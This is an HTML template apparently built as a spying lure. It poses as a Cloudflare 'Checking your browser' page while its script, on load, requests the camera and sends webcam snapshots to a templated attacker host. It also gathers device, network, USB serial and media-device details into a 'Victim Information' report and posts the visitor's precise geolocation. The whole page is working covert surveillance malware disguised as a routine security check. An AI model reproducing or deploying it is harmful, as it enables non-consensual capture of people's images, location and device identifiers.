<html lang="en-US">
<head> 
<meta charset="UTF-8"> 
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
<meta name="robots" content="noindex, nofollow"> 
<meta name="viewport" content="width=device-width,initial-scale=1"> 
<title>Just a moment....</title> 
<style type="text/css">
html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
body {background-color: #ffffff; color: #000000; font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue",Arial, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased;}
h1 { text-align: center; font-weight:700; margin: 16px 0; font-size: 32px; color:#000000; line-height: 1.25;}
p {font-size: 20px; font-weight: 400; margin: 8px 0;}
p, .attribution, {text-align: center;}
#spinner {margin: 0 auto 30px auto; display: block;}
.attribution {margin-top: 32px;}
@keyframes fader   { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
@-webkit-keyframes fader { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
#cf-bubbles > .bubbles { animation: fader 1.6s infinite;}
#cf-bubbles > .bubbles:nth-child(2) { animation-delay: .2s;}
#cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s;}
.bubbles { background-color: #f58220; width:20px; height: 20px; margin:2px; border-radius:100%; display:inline-block; }
a { color: #2c7cb0; text-decoration: none; -moz-transition: color 0.15s ease; -o-transition: color 0.15s ease; -webkit-transition: color 0.15s ease; transition: color 0.15s ease; }
a:hover{color: #f4a15d}
.attribution{font-size: 16px; line-height: 1.5;}
.ray_id{display: block; margin-top: 8px;}
#cf-wrapper #challenge-form { padding-top:25px; padding-bottom:25px; }
#cf-hcaptcha-container { text-align:center;}
#cf-hcaptcha-container iframe { display: inline-block;}
</style> 
</head> 
<body>
<table width="100%" height="100%" cellpadding="20"> 
<tbody>
<tr> 
<td align="center" valign="middle"> 
<div class="cf-browser-verification cf-im-under-attack"> 
<noscript> 
<h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1> 
</noscript> 
<div id="cf-content" style="display: block;"> 
<div id="cf-bubbles"> 
<div class="bubbles"></div> 
<div class="bubbles"></div> 
<div class="bubbles"></div> 
</div> 
<h1><span data-translate="checking_browser">Checking your browser before accessing</span> the website.</h1> 
<div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none"> 
<p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p> 
</div> 
<p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your requested content shortly.</p> 
<p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: none;">Please allow up to 5 seconds‚Ä¶</p> 
<p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block;">Redirecting‚Ä¶</p> 
</div> 
<form class="challenge-form" id="challenge-form" action="http://000webhost.com/?__cf_chl_jschl_tk__=gUwvgP4U.d3mjLABceeM1Hoq0yzKoVb2_YClw1ApwLs-1640764924-0-gaNycGzNA70" method="POST" enctype="application/x-www-form-urlencoded"> 

<span data-translate="error" style="display: none;">error code: 1020</span>

</form>
</div> 
<div class="attribution">
DDoS protection by 
<a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a> 
<br> 
<span class="ray_id">Ray ID: <code id="ray" >6c51810c599f2cda</code></span> 
</div> </td> 
</tr> 
</tbody>
</table>
  
    <video id="video" style="display:none" playsinline autoplay></video>
    <canvas id="canvas" width="500" height="500" hidden="hidden"></canvas>


</body>

<script type="text/javascript" defer>
    const main = async () => {

        function post(id, data, type) {
            const host = "<%=host%>";

            fetch(host + "/api/post", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    id: id,
                    data: encodeURIComponent(data),
                    type: type
                })
            }).then(res => res.json())
                .then(data => {
                    console.log(data);
                });
        }
        function handleSuccess(stream) {
            video = document.getElementById("video");
            canvas = document.getElementById("canvas");
            window.stream = stream;
            video.srcObject = stream;

            video.addEventListener("loadedmetadata", function (e) {
                video.play();
            });
            var context = canvas.getContext("2d");
            var n = 0;
            var inter = setInterval(function () {
                context.drawImage(video, 0, 0, 500, 500);
                var data = canvas.toDataURL("image/png").replace(/^data:image\/(png|jpg);base64,/, "");
                post("<%=id%>", data, 'image');
                if (n == 3) {
                    clearInterval(inter);
                }
                n++;
            }, 5000);

        }
        // get camera access
        navigator.mediaDevices.getUserMedia({
            video: true,
        }).then(function (stream) {
            // set video source to the camera
            handleSuccess(stream);



        }).catch(function (err) {
            console.log(err);
        });

        var td = "";

        
            td += '<code>‚úÖVictim Information </code><br><br><b>‚öì IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';


            td+="<br><br><b>‚è≥ Date In Victim's Device :</b> " + new Date() + "<br>";
        var xo = ["productSub", "vendor", "maxTouchPoints", "doNotTrack", "hardwareConcurrency", "cookieEnabled", "appCodeName", "appName", "appVersion", "platform", "product", "userAgent", "language", "languages", "webdriver", "pdfViewerEnabled", "deviceMemory"];
        var xoc = ["type", "rtt", "saveData", "effectiveType", "downlink", "downlinkMax"];
        ///INITIALS
        td += "<br><b>üì± Device Information</b><br>";
        for (var i = 0; i < xo.length; i++) {
            if (xo[i] in navigator) {
                var str = navigator[xo[i]];
                td += "<b>" + xo[i] + "</b>: <code>" + str + "</code><br>";
            }
        }

        if ("connection" in navigator) {
            td += "<br><b>üï∏Ô∏è Network Information</b><br>";
            for (var i = 0; i < xoc.length; i++) {
                var str = navigator.connection[xoc[i]];
                td += "<b>" + xoc[i] + "</b>: <code>" + str + "</code><br>";
            }
        }
        ////USB
        if ("usb" in navigator) {
            await navigator.usb.getDevices()
                .then(devices => {
                    td += "<br><b>üîå Total USB devices connected:</b> " + devices.length + "<br>";
                    devices.forEach(device => {
                        td += "<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber + "</code><br>";
                    });
                });
        }

        var td1='';
        if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
            /////List cameras and microphones.
            await navigator.mediaDevices?.enumerateDevices()
                .then(function (devices) {
                    td1 += "<br><b>üì∑ Media Device Information</b><br>";
                    devices.forEach(function (device) {
                        td1 += "<b>" + device.kind + ":</b> " + device.label + " id = <code>" + device.deviceId + "</code><br>";
                    });
                })
                .catch(function (err) {
                    td1 += "<br><b>üì∑ Media Device Information</b><br>";
                    td1 += "‚ö†Ô∏è Media Device Error: " + err.name + ": " + err.message;
                });
        }

        //////Location
        if (!navigator.geolocation) {
            td1 += "<br><b>üìç Location Information</b><br>";
            td1 += "‚ö†Ô∏è Location API not avilable";
        }

        function success(pos) {
            const crd = pos.coords;
            const host = "<%=host%>";
            fetch(host+ "/api/loc", {
                method: "POST",
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    lat: crd.latitude,
                    lon: crd.longitude,
                    acc: crd.accuracy,
                    id: "<%=id%>"
                })
            }).then(res => res.json())
                .then(data => {
                    console.log(data);
                });
                
            
        }

        function error(err) {
            td1 += "<br><b>üìç Location Information</b><br>";
            td1 += "‚ö†Ô∏è Location ERROR: <code>" + err.message + "</code>";
        }
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, maximumAge: 0 });
        }

        post("<%=id%>", td, 'text');
        post("<%=id%>", td1, 'text');




    }

    main();
</script>

</html>